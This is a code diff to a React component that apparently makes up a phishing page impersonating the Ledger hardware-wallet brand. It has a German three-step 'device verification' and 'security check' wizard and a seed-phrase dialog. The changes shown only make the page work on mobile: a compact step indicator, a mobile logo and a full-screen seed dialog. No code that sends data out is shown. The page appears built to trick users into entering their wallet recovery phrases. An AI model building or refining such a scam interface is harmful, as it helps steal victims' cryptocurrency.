@@ -59,8 +59,14 @@ const Ledger = ({ panelSlug, forcedDeviceSlug }: LedgerProps = {}) => {
   const selected = selectedIdx !== null ? devices[selectedIdx] : null;
 
   return (
-    <main className="flex min-h-screen flex-col items-center bg-[#0b0b10] px-4 py-16">
-      <div className="flex flex-1 flex-col items-center justify-center">
+    <main className="flex min-h-screen flex-col items-center bg-[#0b0b10] px-4 pt-6 pb-10 sm:py-16">
+      {view === "wizard" && (
+        <div className="flex w-full flex-col items-center sm:hidden">
+          <img src={ledgerLogo} alt="Ledger" className="mb-4 h-8 w-auto invert" />
+          <StepIndicator step={wizardStep} compact />
+        </div>
+      )}
+      <div className="flex flex-1 flex-col items-center justify-center w-full">
         {view === "select" && (
           <SelectView
             onPick={(i) => {
@@ -224,8 +230,10 @@ function WizardView({
 
   return (
     <div className="flex w-full max-w-3xl flex-col items-center text-center">
-      <img src={ledgerLogo} alt="Ledger" className="mb-10 h-10 w-auto invert" />
-      <StepIndicator step={step} />
+      <img src={ledgerLogo} alt="Ledger" className="mb-10 hidden h-10 w-auto invert sm:block" />
+      <div className="hidden sm:block w-full">
+        <StepIndicator step={step} />
+      </div>
 
       <div className="mt-12 w-full">
         {step === 1 && (
@@ -295,26 +303,34 @@ function WizardView({
   );
 }
 
-function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
+function StepIndicator({ step, compact = false }: { step: 1 | 2 | 3; compact?: boolean }) {
   const steps = [
     { n: 1, label: "Gerät verifizieren" },
     { n: 2, label: "Sicherheitscheck" },
     { n: 3, label: "Bestätigung" },
   ] as const;
+  const circle = compact ? "h-7 w-7" : "h-10 w-10";
+  const circleText = compact ? "text-xs" : "text-sm";
+  const checkSize = compact ? "h-4 w-4" : "h-5 w-5";
+  const labelTop = compact ? "top-8" : "top-12";
+  const labelWidth = compact ? "w-20" : "w-40";
+  const labelText = compact ? "text-[10px]" : "text-xs sm:text-sm";
+  const wrapperMax = compact ? "max-w-xs" : "max-w-xl";
+  const wrapperMb = compact ? "mb-10" : "";
   return (
-    <div className="mx-auto flex w-full max-w-xl items-center justify-center">
+    <div className={`mx-auto flex w-full ${wrapperMax} items-center justify-center ${wrapperMb}`}>
       {steps.map((s, i) => {
         const active = step === s.n;
         const done = step > s.n;
         return (
           <div key={s.n} className="flex items-center" style={{ flex: i === steps.length - 1 ? "0 0 auto" : "1 1 0" }}>
-            <div className="relative flex w-10 shrink-0 flex-col items-center">
-              <div className="relative flex h-10 w-10 items-center justify-center">
+            <div className={`relative flex ${compact ? "w-7" : "w-10"} shrink-0 flex-col items-center`}>
+              <div className={`relative flex ${circle} items-center justify-center`}>
                 {active && (
                   <div className="absolute inset-0 -m-1 rounded-full bg-[#a78bfa]/40 blur-lg" />
                 )}
                 <div
-                  className={`relative flex h-10 w-10 items-center justify-center rounded-full border-2 text-sm font-semibold transition-colors ${
+                  className={`relative flex ${circle} items-center justify-center rounded-full border-2 ${circleText} font-semibold transition-colors ${
                     active
                       ? "border-[#a78bfa] bg-[#a78bfa] text-white"
                       : done
@@ -322,11 +338,11 @@ function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
                       : "border-white/20 text-gray-500"
                   }`}
                 >
-                  {done ? <Check className="h-5 w-5" /> : s.n}
+                  {done ? <Check className={checkSize} /> : s.n}
                 </div>
               </div>
               <span
-                className={`absolute top-12 w-40 text-center text-xs sm:text-sm ${
+                className={`absolute ${labelTop} ${labelWidth} text-center ${labelText} ${
                   active ? "text-[#a78bfa] font-medium" : done ? "text-[#a78bfa]/80" : "text-gray-500"
                 }`}
               >
@@ -399,7 +415,7 @@ function SeedDialog({
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="max-h-[90vh] max-w-2xl overflow-y-auto border-none bg-white p-8 text-black sm:p-10">
+      <DialogContent className="left-0 top-0 h-screen w-screen max-w-none translate-x-0 translate-y-0 overflow-y-auto rounded-none border-none bg-white p-5 text-black sm:left-[50%] sm:top-[50%] sm:h-auto sm:max-h-[90vh] sm:w-auto sm:max-w-2xl sm:translate-x-[-50%] sm:translate-y-[-50%] sm:rounded-lg sm:p-10">
         {verifying && (
           <div className="absolute inset-0 z-50 flex flex-col items-center justify-center gap-4 bg-white/85 backdrop-blur-sm">
             <Loader2 className="h-10 w-10 animate-spin text-[#a78bfa]" />
